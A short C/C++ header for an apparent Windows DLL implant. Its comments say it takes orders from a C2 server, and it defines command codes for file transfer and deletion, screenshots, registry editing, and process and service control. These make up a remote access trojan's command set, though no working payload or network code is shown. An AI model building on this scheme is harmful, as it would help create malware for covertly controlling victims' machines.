#pragma once

#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
#define DLL_EXPORT extern "C" __declspec(dllexport)

// Windows Header Files
#include <windows.h>
#include <debugapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

#pragma comment(lib, "WS2_32")

// Most Microsoft function returns are non zero so...
#define SUCCESSFUL (x) \
	((x) > 0 ? TRUE : FALSE)

// I want my own true and false for function returns; will print error codes for debugging 
#define SUCCESS 1
#define FAILURE 0

// Will store constant values from C2 server that will tell us what to do 
#define PUT "1"
#define GET "2"
#define DIR "3"
#define DEL "4"
#define SCREENSHOT "5"
#define REGREAD "6"
#define REGLIST "7"
#define REGWRITE "8"
#define REGDELETE "9"
#define PROCESSLIST "10"
#define PROCESSSTART "11"
#define PROCESSSTOP "12"
#define PROCESSRESTART "13"
#define PROCESSQUERY "14"
#define SERVICELIST "15"
#define SERVICESTART "16"
#define SERVICESTOP "17"
#define SERVICERESTART "18"
#define SERVICEQUERY "19"

